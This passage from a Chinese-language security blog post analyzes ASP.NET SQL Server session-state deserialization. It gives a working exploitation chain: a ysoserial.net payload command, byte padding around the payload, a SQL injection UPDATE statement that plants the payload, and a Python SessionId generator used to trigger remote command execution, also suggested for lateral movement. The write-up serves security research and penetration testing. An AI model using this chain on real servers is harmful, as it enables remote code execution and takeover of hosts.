        }
    }
我们可以从程式码清楚看出主要是呼叫 `ASPState.dbo.TempGetStateItem3 Stored Procedure` 取得 Session
的序列化二进制资料并保存到 buf 变数，最后将 buf 传入 SessionStateUtility.DeserializeStoreData
进行反序列化还原出 Session 物件，而 TempGetStateItem3 这个 SP 则是相当于在执行 `SELECT
SessionItemShort FROM [ASPState].dbo.ASPStateTempSessions`，所以可以知道 Session 是储存在
ASPStateTempSessions 资料表的 SessionItemShort 栏位中。接著让我们继续往下看关键的
DeserializeStoreData 做了什么样的操作。同样地，行数偏多，有需求的朋友请自行下拉。
    namespace System.Web.SessionState {
        public static class SessionStateUtility {
            [SecurityPermission(SecurityAction.Assert, SerializationFormatter = true)]
            internal static SessionStateStoreData Deserialize(HttpContext context, Stream stream) {
                int                 timeout;
                SessionStateItemCollection   sessionItems;
                bool                hasItems;
                bool                hasStaticObjects;
                HttpStaticObjectsCollection staticObjects;
                Byte                eof;
                try {
                    BinaryReader reader = new BinaryReader(stream);
                    timeout = reader.ReadInt32();
                    hasItems = reader.ReadBoolean();
                    hasStaticObjects = reader.ReadBoolean();
                    if (hasItems) {
                        sessionItems = SessionStateItemCollection.Deserialize(reader);
                    } else {
                        sessionItems = new SessionStateItemCollection();
                    }
                    if (hasStaticObjects) {
                        staticObjects = HttpStaticObjectsCollection.Deserialize(reader);
                    } else {
                        staticObjects = SessionStateUtility.GetSessionStaticObjects(context);
                    }
                    eof = reader.ReadByte();
                    if (eof != 0xff) {
                        throw new HttpException(SR.GetString(SR.Invalid_session_state));
                    }
                } catch (EndOfStreamException) {
                    throw new HttpException(SR.GetString(SR.Invalid_session_state));
                }
                return new SessionStateStoreData(sessionItems, staticObjects, timeout);
            }
            static internal SessionStateStoreData DeserializeStoreData(HttpContext context, Stream stream, bool compressionEnabled) {
                return SessionStateUtility.Deserialize(context, stream);
            }
        }
    }
我们可以看到实际上 DeserializeStoreData 又是把反序列化过程转交给其他类别，而依据取出的资料不同，可能会转交给
`SessionStateItemCollection.Deserialize` 或
`HttpStaticObjectsCollection.Deserialize` 做处理，在观察程式码后发现
`HttpStaticObjectsCollection` 的处理相对单纯，所以我个人就选择往这个分支下去研究.
    namespace System.Web {
        public sealed class HttpStaticObjectsCollection : ICollection {
            static public HttpStaticObjectsCollection Deserialize(BinaryReader reader) {
                int     count;
                string  name;
                string  typename;
                bool    hasInstance;
                Object  instance;
                HttpStaticObjectsEntry  entry;
                HttpStaticObjectsCollection col;
                col = new HttpStaticObjectsCollection();
                count = reader.ReadInt32();
                while (count-- > 0) {
                    name = reader.ReadString();
                    hasInstance = reader.ReadBoolean();
                    if (hasInstance) {
                        instance = AltSerialization.ReadValueFromStream(reader);
                        entry = new HttpStaticObjectsEntry(name, instance, 0);
                    }
                    else {
                        // skipped
                    }
                    col._objects.Add(name, entry);
                }
                return col;
            }
        }
    }
跟进去一看，发现 HttpStaticObjectsCollection 取出一些 bytes 之后，又把过程转交给
`AltSerialization.ReadValueFromStream` 进行处理，看到这的朋友们或许会脸上三条线地心想：“该不会又要追进去吧 . .
”，不过其实到此为止就已足够，因为 AltSerialization 实际上类似于 BinaryFormatter
的包装，到此已经有足够资讯作利用，另外还有一个原因兼好消息，当初我程式码追到此处时，上网一查这个物件，发现
[ysoserial.net](https://github.com/pwntester/ysoserial.net) 已经有建立
AltSerialization 反序列化 payload 的 plugin，所以可以直接掏出这个利器来使用！下面一行指令就可以产生执行系统指令
calc.exe 的 base64 编码后的 payload。
    ysoserial.exe -p Altserialization -M HttpStaticObjectsCollection -o base64 -c "calc.exe"
不过到此还是有个小问题需要解决，ysoserial.net 的 `AltSerialization plugin` 所建立的 payload 是攻击
`SessionStateItemCollection` 或 `HttpStaticObjectsCollection`
两个类别的反序列化操作，而我们储存在资料库中的 session 序列化资料是由在此之上还额外作了一层包装的 SessionStateUtility
类别处理的，所以必做点修饰。回头再去看看程式码，会发现 SessionStateUtility 也只添加了几个 bytes，减化后如下所示：
    timeout = reader.ReadInt32();
    hasItems = reader.ReadBoolean();
    hasStaticObjects = reader.ReadBoolean();
    if (hasStaticObjects)
        staticObjects = HttpStaticObjectsCollection.Deserialize(reader);
    eof = reader.ReadByte();
对于 Int32 要添加 4 个 bytes，Boolean 则是 1 个 byte，而因为要让程式路径能进入
HttpStaticObjectsCollection 的分支，必须让第 6 个 byte 为 1 才能让条件达成，先将原本从 ysoserial.net
产出的 payload 从 base64 转成 hex 表示，再前后各别添加 6、1 bytes，如下示意图：
      timeout    false  true            HttpStaticObjectsCollection             eof
    ┌─────────┐  ┌┐     ┌┐    ┌───────────────────────────────────────────────┐ ┌┐
    00 00 00 00  00     01    010000000001140001000000fff ... 略 ... 0000000a0b ff
修饰完的这个 payload 就能用来攻击 SessionStateUtility 类别了！
最后的步骤就是利用开头的 SQL Injection 将恶意的序列化内容注入进去资料库，如果正常浏览目标网站时有出现 `ASP.NET_SessionId`
的 Cookie 就代表已经有一笔对应的 Session 记录储存在资料库里，所以我们只需要执行如下的 SQL Update 语句：
    id=1; UPDATE ASPState.dbo.ASPStateTempSessions
           SET SessionItemShort = 0x{Hex_Encoded_Payload}
           WHERE SessionId LIKE '{ASP.NET_SessionId}%25'; --
分别将 `{ASP.NET_SessionId}`替换成自己的`ASP.NET_SessionId` 的 Cookie 值以及
`{Hex_Encoded_Payload}`替换成前面准备好的序列化 payload 即可。
那假如没有 ASP.NET_SessionId 怎么办？这表示目标可能还未储存任何资料在 Session
之中，所以也就不会产生任何记录在资料库里，但既然没有的话，那我们就硬塞一个 Cookie 给它！ASP.NET 的 SessionId 是透过乱数产生的
24 个字元，但使用了客制化的字元集，可以直接使用以下的 Python script 产生一组
SessionId，例如：plxtfpabykouhu3grwv1j1qw，之后带上 `Cookie:
ASP.NET_SessionId=plxtfpabykouhu3grwv1j1qw`浏览任一个 aspx 页面，理论上 ASP.NET
就会自动在资料库里添加一笔记录。
    import random
    chars = 'abcdefghijklmnopqrstuvwxyz012345'
    print(''.join(random.choice(chars) for i in range(24)))
假如在资料库里仍然没有任何记录出现，那就只能手动刻 INSERT 的 SQL
来创造一个记录，至于如何刻出这部分？只要看看程式码应该就可以很容易构造出来，所以留给大家自行去玩 :P
等到 Payload 顺利注入后，只要再次用这个 Cookie `ASP.NET_SessionId=plxtfpabykouhu3grwv1j1qw`
浏览任何一个 aspx 页面，就会触发反序列化执行任意系统指令！
题外话，利用 SessionState 的反序列化取得 ASP.NET 网站应用程式主机控制权的场景并不仅限于 SQL
Injection。在内网渗透测试的过程中，经常会遇到的情境是，我们透过各方的资讯泄漏 ( 例如：内部 GitLab、任意读档等 ) 取得许多 SQL
Server 的帐号、密码，但唯独取得不了目标 ASP.NET 网站应用程式的 Windows 主机的帐号密码，而为了达成目标 ( 控制指定的网站主机
)，我们就曾经使用过这个方式取得目标的控制权，所以作为内网横向移动的手段也是稍微有价值且非常有趣。至于还能有什么样的花样与玩法，就要靠各位持续地发挥想像力！
* * *